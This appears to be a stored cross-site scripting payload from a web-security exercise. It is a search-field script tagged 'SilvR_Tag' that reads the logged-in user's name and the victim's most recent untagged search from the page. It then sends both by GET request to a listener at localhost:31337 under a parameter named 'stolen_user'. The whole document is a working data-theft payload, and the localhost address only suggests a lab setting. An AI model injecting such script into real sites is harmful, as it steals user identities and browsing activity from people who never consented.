SilvR_Tag	<!-- Tag to know if search was generated by myself or by user-->
<script>
	var userName=document.getElementById('logged-in-user').innerHTML;	// Login
	var lastSearch="NONE_FOUND";	// Default param for last search

	setTimeout(function() {
		var history=document.getElementById('history-list').getElementsByClassName('history-item');
		for (let i=0; i<history.length; i++) {	// Checks through history
			if (history[i].innerHTML.includes('SilvR_Tag')==false) {	// Finds first element without my tag
				lastSearch=history[i].innerHTML;
				break;
			}
		}

		$.get("http://localhost:31337/?stolen_user="+userName+"&last_search="+lastSearch)	// Send Get Request
	}, 300);	// Wait for page to load history
</script>
